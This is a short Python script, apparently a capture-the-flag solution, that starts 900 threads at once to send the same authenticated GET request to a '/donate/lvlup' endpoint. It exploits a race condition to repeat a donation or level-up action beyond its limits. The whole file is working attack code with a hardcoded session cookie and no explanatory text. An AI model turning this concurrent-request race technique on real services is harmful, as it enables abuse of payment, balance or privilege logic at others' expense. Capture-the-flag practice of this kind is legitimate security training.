import requests
import threading

threadArray = []

class expClass(threading.Thread):
    burp0_url = "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup"
    burp0_cookies = {"session": "eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    
    def __init__(self, numMain):
        super(expClass, self).__init__()

    def ham(self):
        requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)

        
    def run(self):
        self.ham()
        


thr = 900



for i in range(0, thr ):
        threadcan = expClass(i)
        threadArray.append(threadcan)
        
for i in range(0, thr):
        threadArray[i].start()
        print "G thread girdi => " + str(i)
for i in range(0, thr):
        threadArray[i].join()
        print "R thread cikti => " + str(i)